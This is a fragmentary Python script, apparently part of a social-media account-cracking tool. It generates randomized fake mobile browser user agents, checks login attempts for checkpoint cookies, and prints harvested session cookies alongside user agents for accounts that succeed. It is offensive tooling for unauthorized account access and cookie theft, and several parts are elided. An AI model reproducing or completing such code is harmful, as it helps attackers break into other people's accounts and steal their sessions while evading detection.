...
#	else:redmi.append(mi)
	A = f'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K)'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
	C = f'{str(rr(30,57))} Build/{B}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82'
	D = f'/Mobile Safari/{str(rr(20,100))}.0.{str(rr(1111,9999))}573.36'
	E = f' NokiaBrowser/1.0.1.56'
	F = f'{A}{C}{D}{E}'
	if F in redmi:pass
	else:redmi.append(F)
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in resok:pass
					...
					if "coki" in akunok:
						...
						print("\r %sCOOKIES : %s "%(P,kuki))
						print("\r  %sUSER AGENT : %s"%(U,ua))
						os.popen('')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
